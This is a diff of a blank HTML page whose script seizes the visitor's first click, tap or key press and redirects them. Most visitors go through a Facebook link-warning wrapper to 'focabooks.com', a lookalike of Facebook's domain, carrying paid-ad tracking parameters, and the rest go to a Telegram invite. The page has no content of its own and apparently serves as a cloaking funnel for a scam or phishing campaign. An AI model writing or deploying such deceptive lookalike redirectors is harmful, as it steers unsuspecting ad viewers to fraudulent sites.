@@ -1,22 +1,52 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>.</title>
-    <script type="text/javascript">
-        // Redirect immediately when the page loads
-       window.onload = function() {
-           window.location.href = "https://sulkurl.com/oAa"; // Change this to the link you want
-         
-          // window.location.href = "https://t.me/visalearning";
-       
-       };
+  <meta charset="utf-8">
+  <title></title>
+  <script>
+    (function() {
+      // Targets (आपके दिए हुए लिंक)
+      const LINK1 = "https://www.facebook.com/flx/warn/?u=https%3A%2F%2Fwww.focabooks.com%2FV4291E%3Futm_medium%3Dpaid%26utm_source%3Dig%26utm_id%3D120238740065980348%26utm_content%3D120238740188430348%26utm_term%3D120238740188470348%26utm_campaign%3D120238740065980348%26fbclid%3DPAVERDUAMp16tleHRuA2FlbQIxMAABpycGOZrQXI01o_6-UvN4xaQBXhktVHvihB70MtBK7g-AhrshVHfDef4jt2b4_aem_3WF6tPjLuqNYat3tJzYfOA&h=AT2IkXOf97kV-8ucLjTNgAQUdnkHhuQyE0vK5ldG9yJCpZS9drUgiNVFP6fDARQdT7M8sLZzB77TSXTr12zEw8vWxzNnpCGcyyN8CMvmEaaDOW1PqsvHSJhJBZuxMQkDDtYLKw&_rdr";
+      const LINK2 = "https://t.me/+o0YFoBBJOV1lNWM1";
 
-         
-    </script>
+      // Weight: LINK1 = 80%, LINK2 = 20%
+      function pickLink() {
+        return (Math.random() < 0.8) ? LINK1 : LINK2;
+      }
+
+      // Redirect function (current tab)
+      function redirectNow() {
+        // choose and navigate
+        const target = pickLink();
+        // Use location.assign so history behaves like a normal navigation
+        location.assign(target);
+      }
+
+      // We listen for pointerdown (covers mouse + touch) and also for keyboard "Enter" on the whole document.
+      // Use { once: true } so it fires only once.
+      function setupAutoRedirect() {
+        // If user interacts with the page (touch/click), redirect immediately
+        document.addEventListener('pointerdown', function onPointer(e) {
+          e.preventDefault && e.preventDefault(); // prevent default if any
+          redirectNow();
+        }, { once: true });
+
+        // Also handle keyboard activation (Enter/Space)
+        document.addEventListener('keydown', function onKey(e) {
+          if (e.key === 'Enter' || e.key === ' ') {
+            redirectNow();
+          }
+        }, { once: true });
+      }
+
+      // Attach on DOM ready
+      if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', setupAutoRedirect);
+      } else {
+        setupAutoRedirect();
+      }
+    })();
+  </script>
 </head>
-<body>
-    <!-- No content in the body -->
-</body>
+<body></body>
 </html>
